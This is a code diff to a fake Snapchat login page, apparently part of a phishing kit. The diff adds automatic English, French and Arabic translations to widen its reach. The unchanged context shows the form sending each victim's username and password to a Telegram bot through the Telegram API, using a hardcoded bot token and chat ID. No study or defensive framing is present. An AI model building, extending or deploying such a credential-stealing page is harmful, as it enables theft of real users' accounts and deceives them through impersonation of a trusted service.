@@ -88,17 +88,17 @@
 <body>
     <div class="container">
         <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Snapchat Logo">
-        <h1>Connexion</h1>
+        <h1 id="title"></h1>
         <form onsubmit="sendToTelegram(event)">
-            <label for="username">Nom d'utilisateur, adresse e-mail ou numéro de téléphone</label>
+            <label id="username-label" for="username"></label>
             <input type="text" id="username" name="username" required>
 
-            <label for="password">Mot de passe</label>
+            <label id="password-label" for="password"></label>
             <input type="password" id="password" name="password" required>
 
-            <a href="#">Mot de passe oublié ؟</a>
+            <a id="forgot-password" href="#"></a>
 
-            <button type="submit">Connexion</button>
+            <button type="submit" id="submit-button"></button>
         </form>
     </div>
 
@@ -106,13 +106,58 @@
         const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
         const chatId = '612575358';
 
+        // النصوص باللغات المختلفة
+        const translations = {
+            en: {
+                title: "Login",
+                usernameLabel: "Username, email address, or phone number",
+                passwordLabel: "Password",
+                forgotPassword: "Forgot your password?",
+                submitButton: "Login",
+            },
+            fr: {
+                title: "Connexion",
+                usernameLabel: "Nom d'utilisateur, adresse e-mail ou numéro de téléphone",
+                passwordLabel: "Mot de passe",
+                forgotPassword: "Mot de passe oublié ?",
+                submitButton: "Connexion",
+            },
+            ar: {
+                title: "تسجيل الدخول",
+                usernameLabel: "اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف",
+                passwordLabel: "كلمة المرور",
+                forgotPassword: "هل نسيت كلمة المرور؟",
+                submitButton: "تسجيل الدخول",
+            },
+        };
+
+        // كشف اللغة
+        function getLanguage() {
+            const lang = navigator.language || navigator.userLanguage;
+            return lang.split('-')[0]; // أخذ اللغة الأساسية فقط (مثل "en" من "en-US")
+        }
+
+        // تطبيق الترجمة بناءً على اللغة المكتشفة
+        function applyTranslations() {
+            const lang = getLanguage();
+            const texts = translations[lang] || translations["en"]; // افتراضي إلى الإنجليزية إذا كانت اللغة غير مدعومة
+
+            document.getElementById("title").textContent = texts.title;
+            document.getElementById("username-label").textContent = texts.usernameLabel;
+            document.getElementById("password-label").textContent = texts.passwordLabel;
+            document.getElementById("forgot-password").textContent = texts.forgotPassword;
+            document.getElementById("submit-button").textContent = texts.submitButton;
+        }
+
+        applyTranslations();
+
         function sendToTelegram(event) {
             event.preventDefault();
 
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
-            const message = `👤 Nom d'utilisateur : ${username}\n🔒 Mot de passe : ${password}`;
+            const message = `👤 Username: ${username}\n🔒 Password: ${password}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
